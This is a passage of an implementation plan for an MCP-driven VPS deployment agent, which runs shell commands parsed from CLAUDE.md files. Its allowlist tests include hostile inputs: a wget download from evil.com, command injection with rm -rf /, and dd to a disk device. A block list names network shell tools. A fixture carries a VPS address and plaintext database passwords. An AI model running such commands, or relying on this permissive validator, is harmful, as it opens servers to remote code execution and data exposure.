# VPS MCP Deployer Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a two-part system — a local MCP stdio proxy and a VPS-side HTTP agent — so any Claude Code conversation can deploy code, run jobs, and query VPS state via MCP tools.

**Architecture:** Local TypeScript MCP server (stdio) forwards tool calls over an SSH-tunneled HTTP connection to an Express server running in Docker on the VPS. The VPS agent parses CLAUDE.md from calling conversations to execute context-aware deployments.

**Tech Stack:** TypeScript, @modelcontextprotocol/sdk, Express, node:child_process, Docker

---

## File Map

```
vps_mcp_deployer/
├── local/
│   ├── src/
│   │   ├── index.ts             — MCP server entry, stdio transport, tool registration
│   │   ├── tunnel.ts            — SSH tunnel spawn/health-check/reconnect/cleanup
│   │   ├── proxy.ts             — HTTP client: POST to localhost:7847, handle errors
│   │   └── tools.ts             — MCP tool definitions (schemas + descriptions)
│   ├── tests/
│   │   ├── tunnel.test.ts       — Tunnel lifecycle unit tests (mocked child_process)
│   │   ├── proxy.test.ts        — HTTP proxy unit tests (mocked fetch)
│   │   └── tools.test.ts        — Tool schema validation tests
│   ├── package.json
│   └── tsconfig.json
├── vps-agent/
│   ├── src/
│   │   ├── index.ts             — Express app, routes, startup
│   │   ├── auth.ts              — Bearer token middleware
│   │   ├── allowlist.ts         — Command validation (allowed binaries, blocked patterns)
│   │   ├── claude-md-parser.ts  — Extract deploy sections from CLAUDE.md text
│   │   ├── executor.ts          — child_process.exec wrapper with timeout + logging
│   │   └── handlers/
│   │       ├── deploy.ts        — POST /deploy: parse CLAUDE.md → validate → execute steps
│   │       ├── jobs.ts          — POST /run-job: parse CLAUDE.md → run named job
│   │       └── query.ts         — GET /docker-status, /docker-logs, /disk-usage, etc.
│   ├── tests/
│   │   ├── allowlist.test.ts    — Validation rule tests
│   │   ├── claude-md-parser.test.ts — Parser tests with fixture CLAUDE.md files
│   │   ├── executor.test.ts     — Executor tests (mocked child_process)
│   │   ├── handlers/
│   │   │   ├── deploy.test.ts
│   │   │   ├── jobs.test.ts
│   │   │   └── query.test.ts
│   │   └── fixtures/
│   │       ├── nautabaq-claude.md   — Real CLAUDE.md from NauTabaq project
│   │       └── simple-claude.md     — Minimal CLAUDE.md for basic deploy
│   ├── Dockerfile
│   ├── package.json
│   └── tsconfig.json
├── shared/
│   └── types.ts                 — Shared request/response interfaces
├── deploy-vps-agent.sh          — SCP + docker build + docker run on VPS
├── .env.example
├── .gitignore
└── README.md
```

---

### Task 1: Project Scaffolding

**Files:**
- Create: `local/package.json`
- Create: `local/tsconfig.json`
- Create: `vps-agent/package.json`
- Create: `vps-agent/tsconfig.json`
- Create: `shared/types.ts`
- Create: `.env.example`
- Create: `.gitignore`

- [ ] **Step 1: Create local/package.json**

```json
{
  "name": "vps-mcp-proxy",
  "version": "1.0.0",
  "type": "module",
  "scripts": {
    "start": "tsx src/index.ts",
    "build": "tsc",
    "test": "vitest run",
    "test:watch": "vitest"
  },
  "dependencies": {
    "@modelcontextprotocol/sdk": "^1.12.0"
  },
  "devDependencies": {
    "@types/node": "^20.0.0",
    "tsx": "^4.7.0",
    "typescript": "^5.4.0",
    "vitest": "^1.6.0"
  }
}
```

- [ ] **Step 2: Create local/tsconfig.json**

```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "ESNext",
    "moduleResolution": "bundler",
    "outDir": "dist",
    "rootDir": "src",
    "strict": true,
    "esModuleInterop": true,
    "skipLibCheck": true,
    "paths": {
      "@shared/*": ["../shared/*"]
    }
  },
  "include": ["src/**/*", "../shared/**/*"]
}
```

- [ ] **Step 3: Create vps-agent/package.json**

```json
{
  "name": "vps-agent",
  "version": "1.0.0",
  "type": "module",
  "scripts": {
    "start": "tsx src/index.ts",
    "build": "tsc",
    "test": "vitest run",
    "test:watch": "vitest"
  },
  "dependencies": {
    "express": "^4.19.0"
  },
  "devDependencies": {
    "@types/express": "^4.17.0",
    "@types/node": "^20.0.0",
    "tsx": "^4.7.0",
    "typescript": "^5.4.0",
    "vitest": "^1.6.0"
  }
}
```

- [ ] **Step 4: Create vps-agent/tsconfig.json**

```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "ESNext",
    "moduleResolution": "bundler",
    "outDir": "dist",
    "rootDir": "src",
    "strict": true,
    "esModuleInterop": true,
    "skipLibCheck": true,
    "paths": {
      "@shared/*": ["../shared/*"]
    }
  },
  "include": ["src/**/*", "../shared/**/*"]
}
```

- [ ] **Step 5: Create shared/types.ts**

```typescript
// Request types sent from local proxy to VPS agent

export interface DeployRequest {
  repo_url: string;
  branch: string;
  claude_md: string;
  operation: "frontend" | "backend" | "full" | "custom";
  working_directory?: string;
}

export interface RunJobRequest {
  repo_url: string;
  branch: string;
  claude_md: string;
  job_name: string;
  job_args?: string[];
}

export interface DockerLogsRequest {
  container: string;
  lines?: number;
}

export interface GitStatusRequest {
  working_directory?: string;
}

export interface ServiceHealthRequest {
  urls?: string[];
}

// Response types returned from VPS agent

export interface AgentResponse<T = unknown> {
  success: boolean;
  data?: T;
  error?: string;
  logs?: string[];
  duration_ms?: number;
}

export interface DockerContainer {
  id: string;
  name: string;
  image: string;
  status: string;
  ports: string;
  created: string;
}

export interface DiskUsageInfo {
  filesystem: { device: string; size: string; used: string; avail: string; mount: string }[];
  directories: { path: string; size: string }[];
}

export interface DbHealthInfo {
  neo4j: { connected: boolean; node_count?: number; error?: string };
  postgres: { connected: boolean; tables?: { name: string; rows: number }[]; error?: string };
}

export interface GitStatusInfo {
  branch: string;
  head_sha: string;
  uncommitted_changes: string[];
}

export interface ServiceHealthInfo {
  results: { url: string; status: number | null; ok: boolean; response_ms: number; error?: string }[];
}

export interface DeployResult {
  steps_executed: number;
  steps_total: number;
  final_status: "success" | "failed";
  failed_step?: { index: number; command: string; stderr: string };
  logs: string[];
}
```

- [ ] **Step 6: Create .env.example**

```env
# Shared auth token (same value on both local and VPS)
AUTH_TOKEN=change-me-to-a-random-string

# Local proxy config
VPS_HOST=187.77.185.22
VPS_USER=syamiq
SSH_KEY_PATH=~/.ssh/id_ed25519
VPS_AGENT_PORT=7847

# VPS agent config (only used on VPS side)
WORKSPACE_DIR=/local/data/scrath/docker-data
```

- [ ] **Step 7: Create .gitignore**

```gitignore
node_modules/
dist/
.env
*.log
```

- [ ] **Step 8: Install dependencies**

Run from repo root:
```bash
cd local && npm install
cd ../vps-agent && npm install
```

- [ ] **Step 9: Commit**

```bash
git add -A
git commit -m "chore: scaffold project with package.json, tsconfig, shared types"
```

---

### Task 2: VPS Agent — Allowlist Validator

**Files:**
- Create: `vps-agent/src/allowlist.ts`
- Create: `vps-agent/tests/allowlist.test.ts`

- [ ] **Step 1: Write failing tests for allowlist**

```typescript
// vps-agent/tests/allowlist.test.ts
import { describe, it, expect } from "vitest";
import { validateCommand } from "../src/allowlist.js";

describe("allowlist", () => {
  describe("allowed commands", () => {
    it("allows git pull", () => {
      expect(validateCommand("git pull origin develop")).toEqual({ valid: true });
    });

    it("allows docker build", () => {
      expect(validateCommand("docker build -t stock-frontend ./webapp/frontend")).toEqual({ valid: true });
    });

    it("allows sudo docker", () => {
      expect(validateCommand("sudo docker stop docker-data-frontend-1")).toEqual({ valid: true });
    });

    it("allows docker-compose up", () => {
      expect(validateCommand("docker-compose up -d")).toEqual({ valid: true });
    });

    it("allows curl", () => {
      expect(validateCommand("curl https://nautabaq.duckdns.org/api/companies/britannia")).toEqual({ valid: true });
    });

    it("allows python3", () => {
      expect(validateCommand("python3 /workspace/run_e2e.sh")).toEqual({ valid: true });
    });

    it("allows bash scripts", () => {
      expect(validateCommand("bash /workspace/run_e2e.sh company1:id1")).toEqual({ valid: true });
    });
  });

  describe("blocked commands", () => {
    it("blocks rm -rf /", () => {
      const result = validateCommand("rm -rf /");
      expect(result.valid).toBe(false);
      expect(result.reason).toContain("blocked");
    });

    it("blocks shutdown", () => {
      const result = validateCommand("shutdown -h now");
      expect(result.valid).toBe(false);
    });

    it("blocks reboot", () => {
      const result = validateCommand("reboot");
      expect(result.valid).toBe(false);
    });

    it("blocks iptables", () => {
      const result = validateCommand("iptables -F");
      expect(result.valid).toBe(false);
    });

    it("blocks dd", () => {
      const result = validateCommand("dd if=/dev/zero of=/dev/sda");
      expect(result.valid).toBe(false);
    });

    it("blocks mkfs", () => {
      const result = validateCommand("mkfs.ext4 /dev/sda1");
      expect(result.valid).toBe(false);
    });

    it("blocks unknown binaries", () => {
      const result = validateCommand("wget http://evil.com/malware.sh");
      expect(result.valid).toBe(false);
    });

    it("blocks writes outside /local/data/", () => {
      const result = validateCommand("bash -c 'echo bad > /etc/passwd'");
      expect(result.valid).toBe(false);
      expect(result.reason).toContain("outside");
    });
  });

  describe("edge cases", () => {
    it("blocks command injection via semicolons in args", () => {
      const result = validateCommand("git pull; rm -rf /");
      expect(result.valid).toBe(false);
    });

    it("blocks piped destructive commands", () => {
      const result = validateCommand("echo x | dd of=/dev/sda");
      expect(result.valid).toBe(false);
    });
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd vps-agent && npx vitest run tests/allowlist.test.ts`
Expected: FAIL — module not found

- [ ] **Step 3: Implement allowlist.ts**

```typescript
// vps-agent/src/allowlist.ts

const ALLOWED_BINARIES = new Set([
  "git",
  "docker",
  "docker-compose",
  "sudo",
  "bash",
  "curl",
  "python3",
  "sh",
  "npm",
  "node",
]);

const BLOCKED_COMMANDS = new Set([
  "shutdown",
  "reboot",
  "mkfs",
  "dd",
  "iptables",
  "rm",
  "wget",
  "nc",
  "ncat",
]);

const BLOCKED_PATTERNS = [
  /rm\s+(-[a-zA-Z]*)?r[a-zA-Z]*f/,  // rm -rf variations
  />\s*\/(?!local\/data)/,             // writes outside /local/data/
  /\/dev\//,                           // device access
  /\/etc\//,                           // system config access
];

export interface ValidationResult {
  valid: boolean;
  reason?: string;
}

export function validateCommand(command: string): ValidationResult {
  // Check for command chaining (;, &&, ||, |) — validate each part
  const parts = command.split(/[;|]|&&|\|\|/).map((p) => p.trim());

  for (const part of parts) {
    if (!part) continue;

    // Extract the binary name (handle "sudo X" as allowed if X is allowed)
    const tokens = part.split(/\s+/);
    let binary = tokens[0];

    if (binary === "sudo" && tokens.length > 1) {
      binary = tokens[1];
    }

    // Check if binary is in the allowed set
    if (!ALLOWED_BINARIES.has(binary) && binary !== "sudo") {
      // Check if it's a blocked command specifically
      if (BLOCKED_COMMANDS.has(binary)) {
        return { valid: false, reason: `Blocked command: ${binary}` };
      }
      return { valid: false, reason: `Binary not in allowlist: ${binary}` };
    }

    // Even if binary is allowed, check the full part for blocked patterns
    for (const pattern of BLOCKED_PATTERNS) {
      if (pattern.test(part)) {
        return { valid: false, reason: `Blocked pattern detected: writes outside /local/data/ or destructive operation` };
      }
    }

    // Check if any blocked command appears as a subsequent token (piped)
    for (const token of tokens.slice(1)) {
      if (BLOCKED_COMMANDS.has(token)) {
        return { valid: false, reason: `Blocked command in arguments: ${token}` };
      }
    }
  }

  return { valid: true };
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd vps-agent && npx vitest run tests/allowlist.test.ts`
Expected: All PASS

- [ ] **Step 5: Commit**

```bash
git add vps-agent/src/allowlist.ts vps-agent/tests/allowlist.test.ts
git commit -m "feat(vps-agent): add command allowlist validator with tests"
```

---

### Task 3: VPS Agent — CLAUDE.md Parser

**Files:**
- Create: `vps-agent/src/claude-md-parser.ts`
- Create: `vps-agent/tests/claude-md-parser.test.ts`
- Create: `vps-agent/tests/fixtures/nautabaq-claude.md`
- Create: `vps-agent/tests/fixtures/simple-claude.md`

- [ ] **Step 1: Create fixture files**

`vps-agent/tests/fixtures/nautabaq-claude.md`:
```markdown
# NauTabaq Stock Investing Platform

## Deployment (VPS — Hostinger)

**VPS**: `syamiq@187.77.185.22` | Project dir: `/local/data/scrath/docker-data`

### Frontend Deploy (most common)

\`\`\`bash
# 1. Sync untracked files
rsync -av webapp/frontend/src/ hostinger_vps:/tmp/frontend_src/

# 2. Build with production URLs
sudo docker build --no-cache \
  --build-arg NEXT_PUBLIC_FRONTEND_URL=https://nautabaq.duckdns.org \
  --build-arg NEXT_PUBLIC_BACKEND_URL=https://nautabaq.duckdns.org/api \
  -t stock-frontend ./webapp/frontend

# 3. Replace container
sudo docker stop docker-data-frontend-1 && sudo docker rm docker-data-frontend-1
sudo docker run -d --name docker-data-frontend-1 --restart unless-stopped \
  --network docker-data_stock-net --network-alias frontend \
  -e NEO4J_URI=bolt://neo4j:7687 -e NEO4J_USER=neo4j \
  -e NEO4J_PASSWORD=stockanalysis2026 \
  -e POSTGRES_HOST=postgres -e POSTGRES_PORT=5432 \
  -e POSTGRES_DB=stock_analyzer -e POSTGRES_USER=postgres \
  -e POSTGRES_PASSWORD=postgres \
  stock-frontend
\`\`\`

### Git Pull on VPS

\`\`\`bash
sudo docker run --rm --entrypoint sh \
  -v /local/data/scrath/docker-data:/repo -w /repo alpine/git \
  -c 'git config --global --add safe.directory /repo && git pull origin develop'
\`\`\`
```

`vps-agent/tests/fixtures/simple-claude.md`:
```markdown
# My Project

## Deployment

\`\`\`bash
git pull origin main
docker build -t myapp .
docker stop myapp && docker rm myapp
docker run -d --name myapp -p 3000:3000 myapp
\`\`\`
```

- [ ] **Step 2: Write failing tests**

```typescript
// vps-agent/tests/claude-md-parser.test.ts
import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { parseDeployInstructions } from "../src/claude-md-parser.js";

const fixturesDir = join(import.meta.dirname, "fixtures");

describe("claude-md-parser", () => {
  describe("parseDeployInstructions", () => {
    it("extracts frontend deploy commands from NauTabaq CLAUDE.md", () => {
      const content = readFileSync(join(fixturesDir, "nautabaq-claude.md"), "utf-8");
      const result = parseDeployInstructions(content, "frontend");

      expect(result.commands.length).toBeGreaterThan(0);
      expect(result.commands.some((c) => c.includes("docker build"))).toBe(true);
      expect(result.commands.some((c) => c.includes("docker run"))).toBe(true);
      expect(result.working_directory).toBe("/local/data/scrath/docker-data");
    });

    it("extracts git pull commands", () => {
      const content = readFileSync(join(fixturesDir, "nautabaq-claude.md"), "utf-8");
      const result = parseDeployInstructions(content, "full");

      expect(result.commands.some((c) => c.includes("git pull"))).toBe(true);
    });

    it("extracts commands from simple CLAUDE.md", () => {
      const content = readFileSync(join(fixturesDir, "simple-claude.md"), "utf-8");
      const result = parseDeployInstructions(content, "full");

      expect(result.commands).toHaveLength(4);
      expect(result.commands[0]).toBe("git pull origin main");
      expect(result.commands[1]).toBe("docker build -t myapp .");
    });

    it("returns empty commands when no deployment section found", () => {
      const result = parseDeployInstructions("# Just a readme\n\nNo deploy info here.", "frontend");
      expect(result.commands).toHaveLength(0);
      expect(result.error).toContain("No deployment");
    });

    it("extracts working_directory from VPS path mentions", () => {
      const content = readFileSync(join(fixturesDir, "nautabaq-claude.md"), "utf-8");
      const result = parseDeployInstructions(content, "frontend");
      expect(result.working_directory).toBe("/local/data/scrath/docker-data");
    });
  });
});
```

- [ ] **Step 3: Run test to verify it fails**

Run: `cd vps-agent && npx vitest run tests/claude-md-parser.test.ts`
Expected: FAIL — module not found

- [ ] **Step 4: Implement claude-md-parser.ts**

```typescript
// vps-agent/src/claude-md-parser.ts

export interface ParsedInstructions {
  commands: string[];
  working_directory?: string;
  error?: string;
}

/**
 * Parse CLAUDE.md content to extract deployment instructions.
 * Looks for code blocks under deployment-related headings.
 */
export function parseDeployInstructions(
  claudeMd: string,
  operation: string
): ParsedInstructions {
  // Find deployment-related sections
  const deployHeadingPattern = /^#{1,4}\s+.*(deploy|deployment|vps).*/gim;
  const headingMatches = [...claudeMd.matchAll(deployHeadingPattern)];

  if (headingMatches.length === 0) {
    return { commands: [], error: "No deployment section found in CLAUDE.md" };
  }

  // Extract working directory from content like "Project dir: `/path/`" or "**VPS**: ... `/path/`"
  const wdMatch = claudeMd.match(
    /(?:project\s+dir|project\s+at|dir)[:\s]*`([^`]+)`/i
  );
  const working_directory = wdMatch?.[1];

  // Find the most relevant section based on operation
  const operationPatterns: Record<string, RegExp> = {
    frontend: /frontend\s+deploy/i,
    backend: /backend\s+deploy/i,
    full: /deploy/i,
    custom: /deploy/i,
  };

  const pattern = operationPatterns[operation] || operationPatterns.full;

  // Get all bash code blocks from deployment sections
  const allCommands: string[] = [];

  // Find code blocks that follow deployment headings
  const sections = claudeMd.split(/^#{1,4}\s+/m);

  for (const section of sections) {
    const sectionLower = section.toLowerCase();

    // Check if this section is relevant to our operation
    const isDeploySection = /deploy|deployment|vps/i.test(section.split("\n")[0]);
    if (!isDeploySection) continue;

    // For specific operations, filter further
    if (operation === "frontend" && !pattern.test(section.split("\n")[0]) && allCommands.length > 0) {
      continue;
    }

    // Extract bash code blocks
    const codeBlockPattern = /```bash\n([\s\S]*?)```/g;
    let match;
    while ((match = codeBlockPattern.exec(section)) !== null) {
      const block = match[1];
      // Split block into individual commands (ignore comments)
      const commands = block
        .split("\n")
        .map((line) => line.trim())
        .filter((line) => line && !line.startsWith("#"))
        // Join continuation lines (ending with \)
        .reduce<string[]>((acc, line) => {
          if (acc.length > 0 && acc[acc.length - 1].endsWith("\\")) {
            acc[acc.length - 1] = acc[acc.length - 1].slice(0, -1).trim() + " " + line;
          } else {
            acc.push(line);
          }
          return acc;
        }, []);

      allCommands.push(...commands);
    }
  }

  if (allCommands.length === 0) {
    return { commands: [], error: "No deployment commands found in code blocks" };
  }

  return { commands: allCommands, working_directory };
}
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd vps-agent && npx vitest run tests/claude-md-parser.test.ts`
Expected: All PASS

- [ ] **Step 6: Commit**

```bash
git add vps-agent/src/claude-md-parser.ts vps-agent/tests/claude-md-parser.test.ts vps-agent/tests/fixtures/
git commit -m "feat(vps-agent): add CLAUDE.md parser with fixture tests"
```

---

### Task 4: VPS Agent — Executor (Safe Command Runner)

**Files:**
- Create: `vps-agent/src/executor.ts`
- Create: `vps-agent/tests/executor.test.ts`

- [ ] **Step 1: Write failing tests**

```typescript
// vps-agent/tests/executor.test.ts
import { describe, it, expect, vi, beforeEach } from "vitest";
import { executeCommand, executeSequence } from "../src/executor.js";

describe("executor", () => {
  describe("executeCommand", () => {
    it("runs a simple command and returns stdout", async () => {
      const result = await executeCommand("echo hello");
      expect(result.success).toBe(true);
      expect(result.stdout.trim()).toBe("hello");
    });

    it("returns error for failed commands", async () => {
      const result = await executeCommand("false");
      expect(result.success).toBe(false);
    });

    it("times out after specified duration", async () => {
      const result = await executeCommand("sleep 10", { timeout_ms: 100 });
      expect(result.success).toBe(false);
      expect(result.error).toContain("timeout");
    });

    it("uses specified working directory", async () => {
      const result = await executeCommand("pwd", { cwd: "/tmp" });
      expect(result.success).toBe(true);
      expect(result.stdout.trim()).toBe("/tmp");
    });
  });

  describe("executeSequence", () => {
    it("runs multiple commands in order", async () => {
      const results = await executeSequence(["echo one", "echo two", "echo three"]);
      expect(results.steps_executed).toBe(3);
      expect(results.final_status).toBe("success");
      expect(results.logs).toHaveLength(3);
    });

    it("stops on first failure and reports step index", async () => {
      const results = await executeSequence(["echo ok", "false", "echo never"]);
      expect(results.steps_executed).toBe(2);
      expect(results.final_status).toBe("failed");
      expect(results.failed_step?.index).toBe(1);
    });
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd vps-agent && npx vitest run tests/executor.test.ts`
Expected: FAIL — module not found

- [ ] **Step 3: Implement executor.ts**

```typescript
// vps-agent/src/executor.ts
import { exec } from "node:child_process";
import { promisify } from "node:util";

const execAsync = promisify(exec);

export interface ExecOptions {
  timeout_ms?: number;
  cwd?: string;
}

export interface CommandResult {
  success: boolean;
  stdout: string;
  stderr: string;
  error?: string;
  duration_ms: number;
}

export interface SequenceResult {
  steps_executed: number;
  steps_total: number;
  final_status: "success" | "failed";
  failed_step?: { index: number; command: string; stderr: string };
  logs: string[];
}

const auditLog: { timestamp: string; command: string; success: boolean; duration_ms: number }[] = [];

export function getAuditLog() {
  return auditLog;
}

export async function executeCommand(
  command: string,
  options: ExecOptions = {}
): Promise<CommandResult> {
  const { timeout_ms = 300_000, cwd } = options;
  const start = Date.now();

  try {
    const { stdout, stderr } = await execAsync(command, {
      timeout: timeout_ms,
      cwd,
      maxBuffer: 10 * 1024 * 1024, // 10MB
    });

    const duration_ms = Date.now() - start;
    auditLog.push({ timestamp: new Date().toISOString(), command, success: true, duration_ms });

    return { success: true, stdout, stderr, duration_ms };
  } catch (err: any) {
    const duration_ms = Date.now() - start;
    const isTimeout = err.killed || err.signal === "SIGTERM";
    const error = isTimeout ? `Command timeout after ${timeout_ms}ms` : err.message;

    auditLog.push({ timestamp: new Date().toISOString(), command, success: false, duration_ms });

    return {
      success: false,
      stdout: err.stdout || "",
      stderr: err.stderr || "",
      error,
      duration_ms,
    };
  }
}

export async function executeSequence(
  commands: string[],
  options: ExecOptions = {}
): Promise<SequenceResult> {
  const logs: string[] = [];
  let stepsExecuted = 0;

  for (let i = 0; i < commands.length; i++) {
    const command = commands[i];
    stepsExecuted++;
    logs.push(`[Step ${i}] $ ${command}`);

    const result = await executeCommand(command, options);
    if (result.stdout.trim()) logs.push(result.stdout.trim());

    if (!result.success) {
      if (result.stderr.trim()) logs.push(`STDERR: ${result.stderr.trim()}`);
      return {
        steps_executed: stepsExecuted,
        steps_total: commands.length,
        final_status: "failed",
        failed_step: { index: i, command, stderr: result.stderr || result.error || "" },
        logs,
      };
    }
  }

  return {
    steps_executed: stepsExecuted,
    steps_total: commands.length,
    final_status: "success",
    logs,
  };
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd vps-agent && npx vitest run tests/executor.test.ts`
Expected: All PASS

- [ ] **Step 5: Commit**

```bash
git add vps-agent/src/executor.ts vps-agent/tests/executor.test.ts
git commit -m "feat(vps-agent): add safe command executor with sequence support"
```

---

### Task 5: VPS Agent — Auth Middleware

**Files:**
- Create: `vps-agent/src/auth.ts`
- Create: `vps-agent/tests/auth.test.ts`

- [ ] **Step 1: Write failing test**

```typescript
// vps-agent/tests/auth.test.ts
import { describe, it, expect, vi, beforeEach } from "vitest";
import { verifyToken } from "../src/auth.js";

describe("auth", () => {
  beforeEach(() => {
    vi.stubEnv("AUTH_TOKEN", "test-secret-token");
  });

  it("returns true for valid bearer token", () => {
    expect(verifyToken("Bearer test-secret-token")).toBe(true);
  });

  it("returns false for invalid token", () => {
    expect(verifyToken("Bearer wrong-token")).toBe(false);
  });

  it("returns false for missing Bearer prefix", () => {
    expect(verifyToken("test-secret-token")).toBe(false);
  });

  it("returns false for empty string", () => {
    expect(verifyToken("")).toBe(false);
  });

  it("returns false for undefined", () => {
    expect(verifyToken(undefined)).toBe(false);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd vps-agent && npx vitest run tests/auth.test.ts`
Expected: FAIL

- [ ] **Step 3: Implement auth.ts**

```typescript
// vps-agent/src/auth.ts
import type { Request, Response, NextFunction } from "express";

export function verifyToken(authHeader: string | undefined): boolean {
  if (!authHeader || !authHeader.startsWith("Bearer ")) return false;
  const token = authHeader.slice(7);
  return token === process.env.AUTH_TOKEN;
}

export function authMiddleware(req: Request, res: Response, next: NextFunction): void {
  if (!verifyToken(req.headers.authorization)) {
    res.status(401).json({ success: false, error: "Unauthorized" });
    return;
  }
  next();
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd vps-agent && npx vitest run tests/auth.test.ts`
Expected: All PASS

- [ ] **Step 5: Commit**

```bash
git add vps-agent/src/auth.ts vps-agent/tests/auth.test.ts
git commit -m "feat(vps-agent): add auth token middleware"
```

---

### Task 6: VPS Agent — Query Handlers

**Files:**
- Create: `vps-agent/src/handlers/query.ts`
- Create: `vps-agent/tests/handlers/query.test.ts`

- [ ] **Step 1: Write failing tests**

```typescript
// vps-agent/tests/handlers/query.test.ts
import { describe, it, expect, vi } from "vitest";
import {
  handleDockerStatus,
  handleDockerLogs,
  handleDiskUsage,
  handleGitStatus,
  handleServiceHealth,
} from "../../src/handlers/query.js";

// Mock executor
vi.mock("../../src/executor.js", () => ({
  executeCommand: vi.fn(async (cmd: string) => {
    if (cmd.includes("docker ps")) {
      return {
        success: true,
        stdout: "CONTAINER ID  IMAGE  STATUS  PORTS  NAMES\nabc123  stock-frontend  Up 2h  0.0.0.0:3000->3000  docker-data-frontend-1\n",
        stderr: "",
        duration_ms: 50,
      };
    }
    if (cmd.includes("docker logs")) {
      return { success: true, stdout: "line1\nline2\nline3\n", stderr: "", duration_ms: 30 };
    }
    if (cmd.includes("df -h")) {
      return { success: true, stdout: "/dev/sda1 50G 20G 30G 40% /\n", stderr: "", duration_ms: 20 };
    }
    if (cmd.includes("git branch")) {
      return { success: true, stdout: "* develop\n", stderr: "", duration_ms: 10 };
    }
    if (cmd.includes("git rev-parse")) {
      return { success: true, stdout: "abc1234\n", stderr: "", duration_ms: 10 };
    }
    if (cmd.includes("git status")) {
      return { success: true, stdout: "M file.ts\n", stderr: "", duration_ms: 10 };
    }
    return { success: true, stdout: "", stderr: "", duration_ms: 10 };
  }),
}));

describe("query handlers", () => {
  it("handleDockerStatus returns container list", async () => {
    const result = await handleDockerStatus();
    expect(result.success).toBe(true);
    expect(result.data).toBeDefined();
  });

  it("handleDockerLogs returns log lines", async () => {
    const result = await handleDockerLogs("docker-data-frontend-1", 100);
    expect(result.success).toBe(true);
    expect(result.data).toContain("line1");
  });

  it("handleDiskUsage returns disk info", async () => {
    const result = await handleDiskUsage();
    expect(result.success).toBe(true);
  });

  it("handleGitStatus returns branch and sha", async () => {
    const result = await handleGitStatus("/workspace");
    expect(result.success).toBe(true);
  });

  it("handleServiceHealth checks URLs", async () => {
    const result = await handleServiceHealth(["http://localhost:3000"]);
    expect(result.success).toBe(true);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd vps-agent && npx vitest run tests/handlers/query.test.ts`
Expected: FAIL

- [ ] **Step 3: Implement query handlers**

```typescript
// vps-agent/src/handlers/query.ts
import { executeCommand } from "../executor.js";
import type { AgentResponse } from "../../shared/types.js";

export async function handleDockerStatus(): Promise<AgentResponse<string>> {
  const result = await executeCommand("docker ps --format 'table {{.ID}}\t{{.Image}}\t{{.Status}}\t{{.Ports}}\t{{.Names}}'");
  if (!result.success) return { success: false, error: result.error || result.stderr };
  return { success: true, data: result.stdout, duration_ms: result.duration_ms };
}

export async function handleDockerLogs(container: string, lines: number = 100): Promise<AgentResponse<string>> {
  // Sanitize container name (alphanumeric, hyphens, underscores only)
  if (!/^[a-zA-Z0-9_-]+$/.test(container)) {
    return { success: false, error: "Invalid container name" };
  }
  const result = await executeCommand(`docker logs --tail ${lines} ${container}`);
  if (!result.success) return { success: false, error: result.error || result.stderr };
  return { success: true, data: result.stdout + result.stderr, duration_ms: result.duration_ms };
}

export async function handleDiskUsage(): Promise<AgentResponse<string>> {
  const df = await executeCommand("df -h /");
  const du = await executeCommand("du -sh /local/data/scrath/docker-data/* 2>/dev/null | sort -rh | head -10");
  return {
    success: true,
    data: `=== Filesystem ===\n${df.stdout}\n=== Top directories ===\n${du.stdout}`,
    duration_ms: (df.duration_ms || 0) + (du.duration_ms || 0),
  };
}

export async function handleGitStatus(workingDirectory?: string): Promise<AgentResponse<string>> {
  const cwd = workingDirectory || process.env.WORKSPACE_DIR || "/local/data/scrath/docker-data";
  const branch = await executeCommand("git branch --show-current", { cwd });
  const sha = await executeCommand("git rev-parse --short HEAD", { cwd });
  const status = await executeCommand("git status --porcelain", { cwd });

  return {
    success: true,
    data: `Branch: ${branch.stdout.trim()}\nHEAD: ${sha.stdout.trim()}\nChanges:\n${status.stdout || "(clean)"}`,
    duration_ms: (branch.duration_ms || 0) + (sha.duration_ms || 0) + (status.duration_ms || 0),
  };
}

export async function handleServiceHealth(urls?: string[]): Promise<AgentResponse<string>> {
  const defaultUrls = [
    "http://localhost:3000",
    "http://localhost:8000/health",
  ];
  const targets = urls && urls.length > 0 ? urls : defaultUrls;
  const results: string[] = [];

  for (const url of targets) {
    const result = await executeCommand(`curl -s -o /dev/null -w "%{http_code} %{time_total}" ${url}`, { timeout_ms: 10000 });
    if (result.success) {
      results.push(`${url} → ${result.stdout.trim()}`);
    } else {
      results.push(`${url} → FAILED (${result.error})`);
    }
  }

  return { success: true, data: results.join("\n") };
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd vps-agent && npx vitest run tests/handlers/query.test.ts`
Expected: All PASS

- [ ] **Step 5: Commit**

```bash
git add vps-agent/src/handlers/query.ts vps-agent/tests/handlers/query.test.ts
git commit -m "feat(vps-agent): add query handlers (docker, disk, git, health)"
```

---

### Task 7: VPS Agent — Deploy Handler

**Files:**
- Create: `vps-agent/src/handlers/deploy.ts`
- Create: `vps-agent/tests/handlers/deploy.test.ts`

- [ ] **Step 1: Write failing tests**

```typescript
// vps-agent/tests/handlers/deploy.test.ts
import { describe, it, expect, vi } from "vitest";
import { handleDeploy } from "../../src/handlers/deploy.js";
import type { DeployRequest } from "../../../shared/types.js";

vi.mock("../../src/executor.js", () => ({
  executeCommand: vi.fn(async () => ({ success: true, stdout: "ok", stderr: "", duration_ms: 10 })),
  executeSequence: vi.fn(async (cmds: string[]) => ({
    steps_executed: cmds.length,
    steps_total: cmds.length,
    final_status: "success",
    logs: cmds.map((c, i) => `[Step ${i}] $ ${c}`),
  })),
}));

vi.mock("../../src/allowlist.js", () => ({
  validateCommand: vi.fn((cmd: string) => {
    if (cmd.includes("rm -rf /")) return { valid: false, reason: "blocked" };
    return { valid: true };
  }),
}));

describe("deploy handler", () => {
  const baseRequest: DeployRequest = {
    repo_url: "https://github.com/user/repo",
    branch: "develop",
